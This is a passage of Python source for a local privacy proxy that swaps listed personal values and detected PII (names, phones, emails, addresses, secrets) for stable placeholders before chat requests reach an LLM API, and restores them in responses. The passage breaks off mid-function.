"""swapback.core: swap known personal values and PII patterns for stable placeholders before a chat request leaves
your machine, and put the real values back in the response.

Plain functions over OpenAI-style JSON; the HTTP proxy (swapback.proxy) is a thin adapter. No ML/NER: what is
swapped is what you list (known values, private terms) plus what the pattern detectors find. Never logs or prints a
real value: counts and types only.

Pieces
  Known values  a YAML/JSON file you write (known_file): {TYPE: [values]} or [[value, TYPE], ...]. Matched with
                pyahocorasick, case-insensitive, whole words; a multi-word value also matches with its words joined by
                any whitespace run (NBSP, tabs), zero-width characters, '.', '_', '-' or '%20', and every such
                variant shares the value's one placeholder. A PHONE entry matches as written and by its digits in
                any grouping (US formats only for US numbers); names also match surname first and without accents.
  Private terms an optional YAML file (private_terms_file): `terms:` phrases or regexes -> «PRIVATE_TERM_n»,
                `figures:` money amounts expanded to every written format ($1.5B, 1,500M, USD 1.5 billion, ...)
                -> «PRIVATE_FIGURE_n».
  Patterns      phones via phonenumbers; email, Luhn card, IBAN, US SSN, IP, URL via Presidio's predefined recognizer
                patterns (vendored); API keys and tokens via the gitleaks default rules (vendored); a few local rules
                where no library exists (street address, keyword-anchored account number / date of birth, order no.).
  Vault         value -> «TYPE_n», one stable map in state_dir/vault.json (0600, local only).
  Restore       exact «TYPE_n», and bare TYPE_n when it is in the vault; streamed text (OpenAI chat chunks and Anthropic
                /v1/messages events) holds back a possibly split placeholder until the next chunk; tool-call arguments
                get JSON-escaped values. A per-request Forms record puts back each variant exactly as it was written.
  Fail closed   any error while scrubbing raises ScrubError (the proxy answers 503 and nothing is forwarded); after the
                swap the outgoing strings are re-checked for known values and the request is blocked if one is left.
  Paths         a known name that fits inside one segment of a filesystem path (/home/<user>/..., ~/...) is left alone,
                so agents' file tools keep working (a name spread over several segments is swapped); restore keeps the
                original case of every value. A value restored inside a JSON string (a JSON reply, a ```json fence,
                an object inline in prose) is JSON-escaped.
CLI: swapback demo | stats | health | canary | scrub-file IN.json | check-config | init   (swapback --help)
"""
import fnmatch, json, os, re, sys, threading, time, hashlib, tempfile

L, R = "\u00ab", "\u00bb"
TYPES = ("PRIVATE_FIGURE", "PRIVATE_TERM", "PERSON", "EMAIL", "PHONE", "ADDRESS", "SSN", "CARD", "IBAN", "ACCOUNT", "DOB",
         "ORDER", "IP", "HOST", "SECRET", "PROFILE", "ORG", "ID", "FAMILY")
PH_RE = re.compile(L + r"([A-Z]+(?:_[A-Z]+)*)_(\d+)" + R)
JS_PH_RE = re.compile(r"(\\+)u00[aA][bB]([A-Z]+(?:_[A-Z]+)*)_(\d+)\1u00[bB][bB]")    # «» escaped inside JSON text
# (\u00ab: one JSON string level; \\u00ab: two, JSON inside JSON; 2**(n-1) backslashes: n levels)
MATCH_DEPTH = 8             # escape levels the matcher and the egress re-check decode (JSON inside JSON inside ...)
# a run of 2**MATCH_DEPTH backslashes or more: an escape that needs more than MATCH_DEPTH decodes (a string nested
# deeper than the matcher reads). Such a string cannot be checked, so the request is blocked, not forwarded.
_PAST_CAP = re.compile(r"\\{%d}" % (2 ** MATCH_DEPTH))
BARE_RE = re.compile(r"(?<![A-Za-z0-9_" + L + r"])(" + "|".join(TYPES) + r")_(\d+)(?![0-9A-Za-z_" + R + r"])")
CANARY = [("Zorblat Quenneville", "PERSON"), ("zorblat.canary@example.org", "EMAIL")]   # fake, used by `canary`
DEFAULTS = {"mode": "on", "listen": "127.0.0.1:8787", "upstream": "https://api.openai.com", "allow_remote": False,
            "known_file": "", "private_terms_file": "", "state_dir": "", "alert_webhook": "", "alert_min_interval_s": 3600,
            "log_requests": True, "restore_bare": True, "patterns": {}, "phone_regions": ["US"],
            "url_swap": ["linkedin.com/in/"], "extra_secret_rules": "", "cache_items": 4000, "canary_model": "",
            "upstream_timeout_s": 900, "scrub_timeout_s": 10, "common_names_title_case": True,
            "system_note": "Note: values written like \u00abPERSON_0\u00bb or \u00abEMAIL_0\u00bb are privacy stand-ins that the "
                           "user's own device swaps back to the real value. Use them exactly as written, including in "
                           "tool arguments, and do not mention them."}
ENV = {"mode": "SWAPBACK_MODE", "listen": "SWAPBACK_LISTEN", "upstream": "SWAPBACK_UPSTREAM",
       "known_file": "SWAPBACK_KNOWN_FILE", "private_terms_file": "SWAPBACK_PRIVATE_TERMS",
       "state_dir": "SWAPBACK_STATE_DIR", "alert_webhook": "SWAPBACK_ALERT_WEBHOOK",
       "canary_model": "SWAPBACK_CANARY_MODEL"}
PATH_KEYS = ("known_file", "private_terms_file", "state_dir", "extra_secret_rules")


class ScrubError(Exception):
    pass


# A request whose check runs past scrub_timeout_s seconds (default 10; 0 = no limit) is stopped and answered 503: the
# check reads the clock between strings, decoded views and hits, so an abandoned request does not keep a CPU busy.
_TL = threading.local()


def _tick():
    dl = getattr(_TL, "deadline", None)
    if dl is not None and time.monotonic() > dl[0]:
        _TL.deadline = None
        raise ScrubError("request took longer than %g s to check (scrub_timeout_s); nothing was forwarded" % dl[1])


class ConfigError(ValueError):
    """a missing, unreadable or malformed config file: the CLI prints it as one line, no traceback."""


# ---------------------------------------------------------------- config
def _env(name):
    """SWAPBACK_X, else the pre-0.2 name PII_SCRUBBER_X (deprecated, read-only fallback)."""
    v = os.environ.get(name)
    if not v and name.startswith("SWAPBACK_"):
        v = os.environ.get("PII_SCRUBBER_" + name[len("SWAPBACK_"):])
    return v


def config_path():
    p = _env("SWAPBACK_CONFIG")
    if p:
        return p
    return "swapback.yaml" if os.path.exists("swapback.yaml") else ""


def load_cfg(path=None):
    """defaults <- YAML config file (SWAPBACK_CONFIG, or ./swapback.yaml) <- SWAPBACK_* env vars
    (the pre-0.2 PII_SCRUBBER_* names are still read when the new one is unset).
    Relative file paths in the config file are relative to that file."""
    import yaml
    c = dict(DEFAULTS)
    path = path if path is not None else config_path()
    base = os.getcwd()
    if path:
        try:
            with open(path, encoding="utf-8") as f:
                d = yaml.safe_load(f) or {}
        except FileNotFoundError:
            raise ConfigError("config file not found: %s" % path) from None
        except OSError as e:
            raise ConfigError("config file %s cannot be read (%s)" % (path, e.strerror or type(e).__name__)) from None
        except yaml.YAMLError as e:
            mk = getattr(e, "problem_mark", None)
            raise ConfigError("config file %s is not valid YAML%s" % (
                path, " (line %d, column %d)" % (mk.line + 1, mk.column + 1) if mk else "")) from None
        if not isinstance(d, dict):
            raise ConfigError("config file %s must be a YAML mapping (key: value lines)" % path)
        c.update(d)
        base = os.path.dirname(os.path.abspath(path))
    for k in PATH_KEYS:
        v = c.get(k)
        if v:
            c[k] = os.path.join(base, os.path.expanduser(str(v)))
    for k, env in ENV.items():
        v = _env(env)
        if v:
            c[k] = os.path.abspath(os.path.expanduser(v)) if k in PATH_KEYS else v
    m = c.get("mode")
    c["mode"] = "on" if m is True else "off" if m is False else str(m).strip().lower()   # YAML reads on/off as bools
    if c["mode"] not in ("off", "watch", "on"):
        raise ConfigError("mode must be on, watch or off")
    t = c.get("scrub_timeout_s")
    if t is not None:                                   # a word, a negative or NaN: one line here, not a silent 10 s
        try:
            tv = None if isinstance(t, bool) else float(t)
        except (TypeError, ValueError):
            tv = None
        if tv is None or tv != tv or tv < 0:
            raise ConfigError("%sscrub_timeout_s must be a number of seconds, 0 or more (0 turns the limit off), not %r"
                              % ("config file %s: " % path if path else "", t))
        c["scrub_timeout_s"] = tv
    ToolPolicy(c.get("tool_restore", True))             # a bad tool_restore section fails here, at load
    from . import hooks as _hooks
    _hooks.spec(c)                                      # a malformed hooks section fails here too (the module loads at start)
    c["_config_dir"] = base
    return c


def state_dir(cfg):
    d = cfg.get("state_dir") or os.path.join(os.environ.get("XDG_STATE_HOME") or os.path.expanduser("~/.local/state"),
                                             "swapback")
    os.makedirs(d, mode=0o700, exist_ok=True)
    return d


def _write_private(path, obj):
    d = os.path.dirname(path)
    fd, tmp = tempfile.mkstemp(dir=d, prefix=".tmp-")
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        json.dump(obj, f, ensure_ascii=False)
    os.chmod(tmp, 0o600)
    os.replace(tmp, path)


# ---------------------------------------------------------------- patterns
def iban_ok(v):
    v = v.replace(" ", "").upper()
    if not 15 <= len(v) <= 34:
        return False
    r = v[4:] + v[:4]
    try:
        return int("".join(str(int(c, 36)) for c in r)) % 97 == 1
    except ValueError:
        return False


SUFFIX = (r"(?:St|Street|Ave|Avenue|Rd|Road|Blvd|Boulevard|Way|Ln|Lane|Dr|Drive|Ct|Court|Pl|Place|Ter|Terrace|Pkwy|"
          r"Parkway|Hwy|Highway|Cir|Circle|Loop|Trl|Trail)")
PATTERNS = [   # (TYPE, regex, group). Only types no maintained library covers; the rest are in scrub_detect.py
    ("HOST", re.compile(r"(?i)(?<![A-Za-z0-9\-.])[a-z0-9][a-z0-9\-]*(?:\.[a-z0-9\-]+)*\.ts\.net\b"), 0),
    ("ORDER", re.compile(r"(?<![\d-])\d{3}-\d{7}-\d{7}(?![\d-])"), 0),
    ("DOB", re.compile(r"(?i)\b(?:born|dob|d\.o\.b\.?|date of birth|birthday|birth date)\b[\s:,\-]*(?:on\s+|is\s+)?"
                       r"(\d{1,2}[/.\-]\d{1,2}[/.\-]\d{2,4}|[A-Z][a-z]{2,8}\.? \d{1,2},? \d{4}|\d{4}-\d{2}-\d{2})"), 1),
    ("ACCOUNT", re.compile(r"(?i)\b(?:account|acct|routing|a/c)\s*(?:no\.?|number|num|#|id)?\s*[:#]?\s*((?:\d[ -]?){6,16}\d)\b"), 1),
    ("ADDRESS", re.compile(r"\b\d{1,6}(?:-\d{1,4})?\s+(?:[NSEW]{1,2}\.?\s+)?(?:\d{1,3}(?:st|nd|rd|th)\s+|[A-Z][a-z]+\s+){1,3}"
                           + SUFFIX + r"\b\.?(?:\s+(?:NE|NW|SE|SW|[NSEW])\b)?(?:,?\s+(?:Apt|Unit|Suite|Ste|#)\.?\s*[A-Za-z0-9\-]+)?"), 0),
    # gitleaks targets source code and misses tokens inside URL query strings (?..._token=<uuid>&...)
    ("SECRET", re.compile(r"(?i)[?&][\w.-]*(?:token|key|secret|sig|auth|code|passw)[\w.-]*="
                          r"((?=[^&#\s\"']*\d)(?=[^&#\s\"']*[A-Za-z])[A-Za-z0-9_\-.%~+/]{16,})"), 1),
    # 0.1.1, generic: an email written with a bracketed at/dot ("ann [at] example [dot] org", "ann(at)example.org")
    ("EMAIL", re.compile(r"(?i)(?<![\w.+\-])[A-Za-z0-9._%+\-]+\s*[\[({<]\s*at\s*[\])}>]\s*[A-Za-z0-9\-]+"
                         r"(?:(?:\s*[\[({<]\s*dot\s*[\])}>]\s*|\.)[A-Za-z0-9\-]+)*"
                         r"(?:\s*[\[({<]\s*dot\s*[\])}>]\s*|\.)[A-Za-z]{2,}(?![\w\-])"), 0),
    # 0.1.1, generic: an email with a full-width/small @ or zero-width characters hidden in it
    ("EMAIL", re.compile(r"(?<![\w.+\-])[\w.+\-\u200b\u200c\u200d\u2060]+[\u200b\u200c\u200d\u2060]*[@\uff20\ufe6b]"
                         r"[\u200b\u200c\u200d\u2060]*[\w\-]+(?:[.\uff0e][\w\-\u200b\u200c\u200d\u2060]+)+"), 0),
    # 0.1.1, generic: IPv6 (full or compressed), checked by the ipaddress module in _valid
    ("IP", re.compile(r"(?<![\w:.])(?:[0-9A-Fa-f]{0,4}:){2,7}[0-9A-Fa-f]{0,4}(?![\w:])"), 0),
]
# cheap substring gates: a pattern runs only when one of its literals is in the lowercased text
GATES = {0: (".ts.net",), 2: ("born", "dob", "d.o.b", "birth"), 3: ("acc", "routing", "a/c"), 5: ("token", "key", "secret",
         "sig", "auth", "code", "passw"), 6: ("at]", "at)", "at}", "at>", "at ]", "at )", "at }", "at >"),
         7: ("\uff20", "\ufe6b", "\u200b", "\u200c", "\u200d", "\u2060"), 8: ("::", ":0", ":1", ":2", ":3", ":4", ":5", ":6",
         ":7", ":8", ":9", ":a", ":b", ":c", ":d", ":e", ":f")}
SKIP_IP = re.compile(r"^(?:127\.|0\.0\.0\.0|255\.|1\.1\.1\.1$|8\.8\.[48]\.[48]$)")


def _valid(t, v):        # local policy on top of the library checks
    if t == "IP":
        if ":" in v and "." not in v:                 # IPv6: a real address, 3+ groups, not loopback/unspecified
            import ipaddress
            try:
                a = ipaddress.IPv6Address(v.split("%")[0])
            except ValueError:
                return False
            return not (a.is_loopback or a.is_unspecified) and sum(1 for g in v.split(":") if g) >= 3
        if SKIP_IP.match(v) or ":" in v and v.startswith("::"):
            return False
        p = v.split("/")[0].split(".")
        return not (len(p) == 4 and int(p[0]) < 10 and all(int(x) < 50 for x in p[1:]))   # 1.2.3.4-style versions
    return True


_DET = {}
DEFAULT_EXTRA_RULES = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vendor", "extra_rules.toml")


def detectors(extra=None):
    """library detectors, built once per process per extra-rules file (gitleaks compile ~50 ms)."""
    extra = extra or DEFAULT_EXTRA_RULES
    if extra not in _DET:
        from . import detect as d
        _DET[extra] = (d, d.Presidio(iban_ok=iban_ok), d.Gitleaks(extra=extra))
    return _DET[extra]


# ---------------------------------------------------------------- known values
def _lower1(v):
    """lower case, one character for one (detect.lower_same_len): a capital dotted I (Turkish \u0130) is "i", not
    "i" + a combining dot, so a listed "\u0130pek" and the text that writes it meet on the same key."""
    from .detect import lower_same_len
    return lower_same_len(v)


def _norm_key(v):
    return re.sub(r"\s+", " ", _lower1(v.strip()))


# Between the words of a known multi-word value: any run of Unicode whitespace (NBSP, tabs, several spaces), zero-width
# characters, '.', '_', '-' or a URL-encoded space. "Jane Doe", "Jane\u00a0Doe", "Jane.Doe", "JANE_DOE" and "Jane%20Doe"
# are the same value: one placeholder, and the egress re-check uses the same rule.
SEP_RX = r"(?:[\s\u200b\u200c\u200d\u2060\ufeff._\-]|%20)+"
_SEP_RE = re.compile(SEP_RX)


def _canon(v):
    """the key a value is stored under when its written variants share one placeholder."""
    return _SEP_RE.sub(" ", _lower1(v.strip())).strip()


# Matching (not the vault key) also takes '+' (a space in URL query strings and HTML form bodies: ?q=Jane+Doe) and '/'
# ("Jane/Doe") between the words.
MATCH_SEP_RX = r"(?:[\s\u200b\u200c\u200d\u2060\ufeff._\-+/]|%20)+"

# Inside a listed multi-word value that is not a name (an address, an org): commas and semicolons also separate the
# parts, so "17 Example Mews, Dublin" also matches the same address written over two lines or without the comma.
LOOSE_SEP_RX = r"(?:[\s\u200b\u200c\u200d\u2060\ufeff._\-+/,;]|%20)+"

# Between the words of a listed name: those separators, or one comma with spaces or tabs around it ("Thanks Faith,
# Ridge trail ...", a CSV row 3,Faith,Ridge,Reno), the way a tab-separated row already matched. A comma name in lower
# case between ordinary words ("say grace, lee side") is still left alone (_comma_words). A " | " with blanks on both
# sides counts the same way, so a name split across markdown table cells ("| Penny | Crane |") is swapped (0.4.12).
NAME_SEP_RX = r"(?:" + MATCH_SEP_RX + r"|[ \t]*,[ \t]*|[ \t]+\|[ \t]+)"


def _variant_words(key, loose=False):
    """the words of a listed multi-word or hyphenated value, as _variant_rx joins them."""
    return [w for w in re.split(r"[\s,;]+", key) if w] if loose else [w for w in key.split(" ") if w]


def _variant_rx(key, loose=False):
    """regex for a known multi-word value in any separator/case variant, with the matcher's whole-word edges.
    loose: commas and semicolons count as separators too (addresses and other non-name values).
    A hyphen inside a listed word is interchangeable with any separator or with nothing: "Ferrand-Moreau",
    "Ferrand Moreau", "Ferrand.Moreau" and "FerrandMoreau" are the same written value."""
    words = _variant_words(key, loose)
    sep = LOOSE_SEP_RX if loose else NAME_SEP_RX

    def word(w):
        parts = [p for p in w.split("-") if p]
        return ("(?:%s)?" % sep).join(re.escape(p) for p in parts) if parts else re.escape(w)
    return re.compile(r"(?<![\w@.])" + sep.join(word(w) for w in words) + r"(?![\w@])", re.I)


def _title_case(surface):
    """every word of the surface form starts with a capital ("Will Hunt", "WILL HUNT", "Hunt, Will")."""
    w = re.findall(r"[^\W\d_]+", surface)
    return bool(w) and all(x[0].isupper() for x in w)


def _all_caps(surface):
    """every letter is a capital ("CAROL SINGER WANTED"): a heading or a shout, not how a name is written."""
    w = "".join(re.findall(r"[^\W\d_]+", surface))
    return len(w) > 1 and w.isupper()


def _name_case(surface, all_caps=False):
    """written the way a name is: Title Case ("Will Hunt", "Hunt, Will"). ALL-CAPS counts only with all_caps
    (common_names_all_caps: true), so a heading "CAROL SINGER WANTED" is left alone by default."""
    return _title_case(surface) and (all_caps or not _all_caps(surface))


# ---------------------------------------------------------------- escaped text (decoded views)
# A listed value can reach the scrubber written in an escaped form: Python's json.dumps writes "S\u00f8ren" for
# "Søren" (tool results, tool-call arguments built by the client), HTML writes "&oslash;" or "&#248;", URLs write
# "%C3%B8". The model decodes all of these, so swapback matches the decoded text too and maps each hit back to the
# escaped span it came from. Detection only: the text is never rewritten except where a listed value is swapped.
_ESC_HINT = re.compile(r"\\[uUxnrt\"/\\]|&#?[A-Za-z0-9]{1,31};|%[0-9a-fA-F]{2}")
_ESC_TOK = re.compile(r"\\u[dD][89abAB][0-9a-fA-F]{2}\\u[dD][c-fC-F][0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4}|\\U[0-9a-fA-F]{8}"
                      r"|\\x[0-9a-fA-F]{2}|\\[nrt\"/\\]|&#[0-9]{1,7};|&#[xX][0-9a-fA-F]{1,6};|&[A-Za-z][A-Za-z0-9]{1,31};"
                      r"|(?:%[0-9a-fA-F]{2})+")
_SIMPLE = {"n": "\n", "r": "\r", "t": "\t", '"': '"', "/": "/", "\\": "\\"}


def _unesc_tok(tok):
    """[(decoded text, offset of its first source char in tok)] for one escape token, or None to keep it as written."""
    try:
        if tok[0] == "\\":
            c = tok[1]
            if c in _SIMPLE:
                return [(_SIMPLE[c], 0)]
            if c == "u" and len(tok) == 12:                   # a surrogate pair: one character
                hi, lo = int(tok[2:6], 16), int(tok[8:12], 16)
                return [(chr(0x10000 + ((hi - 0xD800) << 10) + (lo - 0xDC00)), 0)]
            n = int(tok[2:], 16)
            if 0xD800 <= n <= 0xDFFF or n > 0x10FFFF:
                return None
            return [(chr(n), 0)]
        if tok[0] == "&":
            if tok[1] == "#":
                n = int(tok[3:-1], 16) if tok[2] in "xX" else int(tok[2:-1])
                return [(chr(n), 0)] if 0 < n <= 0x10FFFF and not 0xD800 <= n <= 0xDFFF else None
            import html.entities
            v = html.entities.html5.get(tok[1:])
            return [(v, 0)] if v and len(v) == 1 else None
        b = bytes.fromhex(tok.replace("%", ""))               # a run of %XX: UTF-8, character by character
        out, i = [], 0
        while i < len(b):
            n = 1 if b[i] < 0x80 else 2 if 0xC0 <= b[i] < 0xE0 else 3 if 0xE0 <= b[i] < 0xF0 else 4 if 0xF0 <= b[i] < 0xF8 else 0
            try:
                if not n:                                 # a lone continuation byte (%A0, %BF) or 0xF8+: kept as written
                    raise ValueError
                out.append((b[i:i + n].decode("utf-8"), 3 * i))
                i += n
            except (UnicodeDecodeError, ValueError):
                out.append((tok[3 * i:3 * i + 3], 3 * i))
                i += 1
        return out
    except (ValueError, OverflowError):
        return None


def _decode_once(text):
    """(decoded, starts): starts[i] is where decoded character i begins in text; starts[len(decoded)] == len(text)."""
    out, starts, pos = [], [], 0
    for m in _ESC_TOK.finditer(text):
        s = m.start()
        for i in range(pos, s):
            out.append(text[i])
            starts.append(i)
        parts = _unesc_tok(m.group(0))
        if parts is None:
            for i in range(s, m.end()):
                out.append(text[i])
                starts.append(i)
        else:
            for piece, off in parts:
                for ch in piece:
                    out.append(ch)
                    starts.append(s + off)
        pos = m.end()
    for i in range(pos, len(text)):
        out.append(text[i])
        starts.append(i)
    starts.append(len(text))
    return "".join(out), starts


def decoded_views(text, depth=3):
    """[(decoded text, index map back to text)] when text carries escapes (JSON \\uXXXX, \\xXX, \\n, HTML entities,
    %XX), up to `depth` levels (JSON inside JSON). Empty when there is nothing to decode."""
    views, cur, m = [], text, None
    for _ in range(depth):
        if not cur or not _ESC_HINT.search(cur):
            break
        d, st = _decode_once(cur)
        if d == cur:
            break
        m = st if m is None else [m[j] for j in st]
        views.append((d, m))
        cur = d
    return views


# A value can also be written so that it looks different but reads the same: accents in decomposed form (NFD: "e" +
# U+0301, common in macOS file names and some PDFs), zero-width characters inside a word ("Jo\u200bhn"), fullwidth
# digits and letters ("\uff10\uff14\uff19\uff18"). Matching and the egress re-check both also look at a normalized view: NFC,
# zero-width characters removed, fullwidth ASCII folded. Base64 and other re-encodings are out of scope.
_ZW = frozenset("\u200b\u200c\u200d\u2060\ufeff\u00ad\u180e")
_NORM_HINT = re.compile("[\u200b\u200c\u200d\u2060\ufeff\u00ad\u180e\u0300-\u036f\u1ab0-\u1aff\u1dc0-\u1dff\u20d0-\u20ff"
                        "\ufe20-\ufe2f\uff01-\uff5e\u3000\u3099\u309a]")


def _normalize(text):
    """(normalized, starts) like _decode_once: NFC per base character + its combining marks, zero-width removed,
    fullwidth ASCII (U+FF01-FF5E) and the ideographic space folded, and the combining dot after an i dropped
    ("i\u0307" is how Python lower-cases a capital dotted I: "\u0130rem" written "i\u0307rem" is "irem")."""
    import unicodedata
    out, starts, i, n = [], [], 0, len(text)
    comb = unicodedata.combining
    while i < n:
        c = text[i]
        if c in _ZW:
            i += 1
            continue
        o = ord(c)
        if 0xFF01 <= o <= 0xFF5E or o == 0x3000:
            out.append(chr(o - 0xFEE0) if o != 0x3000 else " ")
            starts.append(i)
            i += 1
            continue
        j = i + 1
        while j < n and (comb(text[j]) or text[j] in _ZW):
            j += 1
        if j > i + 1:
            marks = "".join(x for x in text[i:j] if x not in _ZW)
            if c in "iI":                       # "i" + a combining dot above: the lower case of a capital dotted I
                marks = c + marks[1:].replace("\u0307", "", 1)
            piece = unicodedata.normalize("NFC", marks)
        else:
            piece = c
        for ch in piece:
            out.append(ch)
            starts.append(i)
        i = j
    starts.append(n)
    return "".join(out), starts


def _tag_view(text):
    """(text with each HTML tag such as <br>, </p><p> or <span ...> read as one line break, starts) like _normalize:
    an address whose lines are joined by <br> is matched as the listed multi-line address."""
    out, starts, i = [], [], 0
    for m in _HTML_TAG.finditer(text):
        for j in range(i, m.start()):
            out.append(text[j])
            starts.append(j)
        out.append("\n")
        starts.append(m.start())
        i = m.end()
    for j in range(i, len(text)):
        out.append(text[j])
        starts.append(j)
    starts.append(len(text))
    return "".join(out), starts


_QUOTE_MARK = re.compile(r"(?m)^[ \t]*(?:(?:>[ \t]?)+|\|[ \t]?)")     # "> ", ">> ", "> > ", or one "| "
_QUOTE_LINE = re.compile(r"(?m)^[ \t]*[>|].*\n[ \t]*[>|]")      # two quoted lines in a row


def _quote_view(text):
    """(text with the > (or |) quote markers at the start of each line removed, starts) like _tag_view: an address quoted in
    a reply ("> 27 Example Mews\n> Unit 9") is matched as the listed multi-line address."""
    out, starts, i = [], [], 0
    for m in _QUOTE_MARK.finditer(text):
        if m.end() == m.start():
            continue
        for j in range(i, m.start()):
            out.append(text[j])
            starts.append(j)
        i = m.end()
    for j in range(i, len(text)):
        out.append(text[j])
        starts.append(j)
    starts.append(len(text))
    return "".join(out), starts



_SENT_END = re.compile(r"[^\W\d_]{2}[.!?]+(?:\s|<|$)")
_BLOCK_BREAK = re.compile(r"</?(?:div|p|li|td|th|tr|h[1-6]|ul|ol|table|tbody|thead|section|article|header|footer|"
                          r"blockquote|pre|dd|dt|dl)\b[^<>]{0,200}>|\n[^\S\n]*\n", re.I)


_BLOCK_TAG = re.compile(r"</?(?:div|p|li|td|th|tr|h[1-6]|ul|ol|table|tbody|thead|section|article|header|footer|"
                        r"blockquote|pre|dd|dt|dl)\b[^<>]{0,200}>", re.I)
_CELL_GAP = re.compile(r"(?:\s|\\+[nrt]|&nbsp;|&#160;|</?(?:b|i|u|em|strong|span|font|a|small)\b[^<>]{0,200}>)+", re.I)
_BLOCK_TAG_END = re.compile(_BLOCK_TAG.pattern + r"$", re.I)


def _cell_name(surface, value, before, after):
    """a dictionary-word name whose words each fill one HTML block element of their own (a first/last-name table
    row <td>Hazel</td><td>Woods</td>, list items, divs): every block holds exactly one word, those words joined are
    the listed name, and no row or list boundary (</tr>, </ul>, </table> ...) sits between them. Where the pair sits
    in the row, what the cells around it hold, their attributes and the whitespace between them do not matter."""
    words = [w for w in (_CELL_GAP.sub(" ", x).strip() for x in _BLOCK_TAG.split(surface)) if w]
    want = value.split()
    if len(words) < 2 or any(" " in w for w in words) or [w.lower() for w in words] != [w.lower() for w in want]:
        return False
    if _RUN_EDGE.search(surface):
        return False
    b = _CELL_GAP.sub(" ", before[-300:]).rstrip()
    a = _CELL_GAP.sub(" ", after[:300]).lstrip()
    return bool(_BLOCK_TAG_END.search(b) and _BLOCK_TAG.match(a))


_RUN_EDGE = re.compile(r"</?(?:tr|ul|ol|table|tbody|thead|dl|section|article|header|footer)\b", re.I)


def _name_break(surface, value, before=None, after=None):
    """True when the words of a dictionary-word name are split by a sentence end ("Saving Grace. Fields of gold"), a
    blank line or separate HTML block elements ("<div>Grace</div>\n<div>Fields</div>"): two ordinary words that
    only sit side by side, not a name. False when the listed value itself is written that way, and False when each
    word fills a block element of its own and the words joined are the listed name (before/after: the text around
    the surface; see _cell_name)."""
    if not surface:
        return False
    for rx in (_SENT_END, _BLOCK_BREAK):
        m = rx.search(surface)
        if m and m.end() < len(surface) and not rx.search(value):
            if rx is _BLOCK_BREAK and before is not None and _cell_name(surface, value, before, after or ""):
                return False
            return True
    return False


def _listed_first(sp):
    """spans_keyed entries minus pattern-detector hits (priority 1) that cut into a listed value or private term
    (priority 0) without covering it whole: a listed value is swapped as one piece, so the street line that the
    address pattern also sees cannot split a listed multi-line address and leave its later lines behind."""
    claimed = sorted((x[0], x[1]) for x in sp if x[3] == 0)
    if not claimed or len(claimed) == len(sp):
        return sp
    import bisect
    starts = [a for a, _b in claimed]
    longest = max(b - a for a, b in claimed)
    out = []
    for x in sp:
        if x[3] == 0:
            out.append(x)
            continue
        s, e = x[0], x[1]
        k, cut = bisect.bisect_left(starts, e), False
        while k > 0:
            k -= 1
            a, b = claimed[k]
            if a < s - longest:
                break
            if b > s and not (s <= a and b <= e):
                cut = True
                break
        if not cut:
            out.append(x)
    return out


def match_views(text):
    """[(view, index map back to text, surface(s, e), ctx(s, e))]: the normalized text, each decoded view (decoded_views) and each
    decoded view normalized. surface: the spelling a hit at view[s:e] is restored as — None when the view is only a
    normalization of the text as written (the written span itself comes back, byte-exact), else the decoded spelling
    before normalization. ctx: (before, after) around a hit at view[s:e], read in the decoded text the view was
    built from, tags kept (see _view_around)."""
    views = []
    if _NORM_HINT.search(text):
        d, st = _normalize(text)
        if d != text:
            views.append((d, st, lambda s, e: None, None))
    if "<" in text and _HTML_TAG.search(text):
        d, st = _tag_view(text)
        views.append((d, st, lambda s, e: None, None))
    if (">" in text or "|" in text) and _QUOTE_LINE.search(text):
        d, st = _quote_view(text)
        views.append((d, st, lambda s, e: None, None))
    for d, m in decoded_views(text, depth=MATCH_DEPTH):
        views.append((d, m, lambda s, e, d=d: d[s:e], lambda s, e, d=d: _view_around(d, s, e)))
        if _NORM_HINT.search(d):
            nd, st = _normalize(d)
            if nd != d:
                views.append((nd, [m[j] for j in st], lambda s, e, d=d, st=st: d[st[s]:st[e]],
                              lambda s, e, d=d, st=st: _view_around(d, st[s], st[e])))
        if "<" in d and _HTML_TAG.search(d):       # "Lane<br />\nUnit 12C" in JSON text: decoded, tags as line breaks
            td, st = _tag_view(d)
            views.append((td, [m[j] for j in st], lambda s, e, d=d, st=st: d[st[s]:st[e]],
                          lambda s, e, d=d, st=st: _view_around(d, st[s], st[e])))
        if (">" in d or "|" in d) and _QUOTE_LINE.search(d):     # an e-mail reply quoted with "> " inside JSON text
            qd, st = _quote_view(d)
            views.append((qd, [m[j] for j in st], lambda s, e, d=d, st=st: d[st[s]:st[e]],
                          lambda s, e, d=d, st=st: _view_around(d, st[s], st[e])))
    return views


class Forms:
    """per-request record of the surface form behind each placeholder, in order of occurrence. Variants of one value
    share a placeholder; restore with the same Forms puts back the form that was written (occurrence by occurrence,
    then the last one seen), so a round trip stays byte-exact."""

    def __init__(self):
        self.seen, self.next = {}, {}

    def add(self, ph, v):
        self.seen.setdefault(ph, []).append(v)

    def take(self, ph):
        lst = self.seen.get(ph)
        if not lst:
            return None
        i = self.next.get(ph, 0)
        self.next[ph] = i + 1
        return lst[i] if i < len(lst) else lst[-1]


def _digits(s):
    return re.sub(r"\D", "", s)


_US_GROUPED = re.compile(r"(?:\+?1[\s.\-]?)?(?:\(\d{3}\)\s?\d{3}[\s.\-]\d{4}|\d{3}([\s.\-])\d{3}\1\d{4})")


def _is_us_phone(p):
    """True only for a number that is actually a US/NANP one: +1/1 and 10 digits, a number phonenumbers calls valid in
    the US, or 10 digits written in the US 3-3-4 grouping. "98765 43210" (India) and "0412 345 678" (Australia) are not."""
    s, d = p.strip(), _digits(p)
    if len(d) == 11 and d[0] == "1":
        if not s.lstrip("(").startswith(("+1", "1")):
            return False
        d = d[1:]
    elif len(d) != 10 or s.startswith("+"):
        return False
    if d[0] not in "23456789" or d[3] not in "23456789":
        return False                                   # NANP: area code and exchange never start with 0 or 1
    if _US_GROUPED.fullmatch(s):
        return True
    try:
        import phonenumbers
        return phonenumbers.is_valid_number_for_region(phonenumbers.parse(s, "US"), "US")
    except Exception:
        return False


def _phone_core(p):
    """the digits that identify a listed phone however it is written: the national number without a country code or
    trunk 0 ("+91 98765 43210" -> 9876543210, "0412 345 678" -> 412345678). None when under 7 digits."""
    s, d = p.strip(), _digits(p)
    if s.startswith("+"):
        try:
            import phonenumbers
            d = str(phonenumbers.parse(s, None).national_number)
        except Exception:
            pass
    elif len(d) == 11 and d[0] == "1" and _is_us_phone(p):
        d = d[1:]
    else:
        d = d.lstrip("0")
    return d if len(d) >= 7 else None


def _listed_key(v, t):
    """one key per listed value: a phone's written forms (load_known expands them) share their national digits."""
    if t == "PHONE":
